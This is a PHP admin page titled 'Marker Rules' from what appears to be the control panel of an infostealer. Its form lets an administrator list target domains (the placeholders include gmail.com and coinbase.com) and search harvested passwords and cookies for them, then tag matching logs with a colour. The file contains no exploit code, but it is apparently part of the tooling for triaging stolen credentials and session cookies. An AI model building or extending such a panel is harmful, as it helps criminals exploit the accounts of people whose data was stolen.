<?php

include "../config.php";
include_once "app/functions.php";
include_once "app/managers/AccountManager.php";

session_start();

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$page_name = "Marker Rules";

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    header("Location: dashboard");
    exit();
}

include_once 'app/pages/header.php';

?>
<div class="body-wrapper">
    <div class="container-fluid">
        
        <div class="card card-body py-3">
            <div class="row align-items-center">
                <div class="col-12">
                    <div class="d-sm-flex align-items-center justify-space-between">
                        <h4 class="mb-4 mb-sm-0 card-title">Marker Rules</h4>
                        <nav aria-label="breadcrumb" class="ms-auto">
                            <a href="javascript:void(0)" id="btn-add-contact" class="btn btn-xs btn-primary align-items-center" onclick="createRuleModal();">Create Rule</a>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
        
        <style>
        #markers_table td {white-space: normal;word-wrap: break-word;}
        </style>

        <table id="markers_table" class="table text-nowrap customize-table mb-0 align-middle" >
            <thead class="text-dark fs-4">
                <tr>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">ID</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Name</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">URLs</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Search in</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Color</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Status</h6>
                    </th>
                    <th>
                        <h6 class="fs-4 fw-semibold mb-0">Actions</h6>
                    </th>
                </tr>
            </thead>
            <tbody>

            </tbody>
        </table>
    </div>
</div>
</div>

<!-- Modal Create Rule -->
<div class="modal fade" id="create_rule_modal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-2">
    <div class="modal-dialog modal-dialog-scrollable modal-lg">
        <div class="modal-content">
            <div class="modal-header d-flex align-items-center">
                <h4 class="modal-title" id="modal_create_rule_header">Create Marker Rule</h4>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            
            <div class="modal-body">
                <div class="card">
                    <div>
                    
                        <div class="form-body">
                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <input type="text" class="form-control" placeholder="Rule Name" id="create_rule_name">
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-12">
                                    <div class="mb-3">
                                        <div class="form-group">
                                            <textarea class="form-control" rows="10" placeholder="gmail.com&#10;fb.com&#10;twitter.com&#10;coinbase.com" id="create_rule_urls"></textarea>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="row">
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <div class="form-check py-2">
                                            <input class="form-check-input" type="checkbox" value="" id="create_rule_in_passwords">
                                            <label class="form-check-label" for="create_rule_in_passwords">Search in Passwords</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="mb-3">
                                    <div class="form-check py-2">
                                            <input class="form-check-input" type="checkbox" value="" id="create_rule_in_cookies">
                                            <label class="form-check-label" for="create_rule_in_cookies">Search in Cookies</label>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="mb-3">
                                        <div class="form-group mb-4">
                                            <select class="form-select" id="create_rule_color">
                                                <option value="#635BFF" data-color="#635BFF">Blue-Violet</option>
                                                <option value="#16CDC7" data-color="#16CDC7">Turquoise</option>
                                                <option value="#36C76C" data-color="#36C76C">Emerald Green</option>
                                                <option value="#46CAEB" data-color="#46CAEB">Sky Blue</option>
                                                <option value="#F8C20A" data-color="#F8C20A">Golden Yellow</option>
                                                <option value="#FF6692" data-color="#FF6692">Hot Pink</option>
                                                <option value="#6610F2" data-color="#6610F2">Vivid Purple</option>
                                                <option value="#539BFF" data-color="#539BFF">Cornflower Blue</option>
                                            </select>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <a id="modal_create_button" href="#" class="btn btn-primary" >Create</a>
                    <button type="button" class="btn bg-danger-subtle text-danger  waves-effect text-start" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>        
</div>

<div class="dark-transparent sidebartoggler"></div>

<?php include_once 'app/pages/footer.php'; ?>

<script>
function formatOption(option) 
{
    if (!option.id) {
        return option.text;
    }
    
    var color = $(option.element).data('color');
    
    var $option = $(
        '<span><svg width="12" height="12" viewBox="0 0 24 24" style="vertical-align:middle; margin-right:5px;"><circle cx="12" cy="12" r="10" fill="' + color + '"/></svg>' + option.text + '</span>'
    );
    
    return $option;
};

$(document).ready(function() 
{
    $('#create_rule_color').select2({
        dropdownParent: $('#create_rule_modal'),
        templateResult: formatOption,
        templateSelection: formatOption,
        escapeMarkup: function(markup) { return markup; }
    });
});
</script>

<!-- markers worker -->
<script src="assets/js/markers.js"></script>
</body>
</html>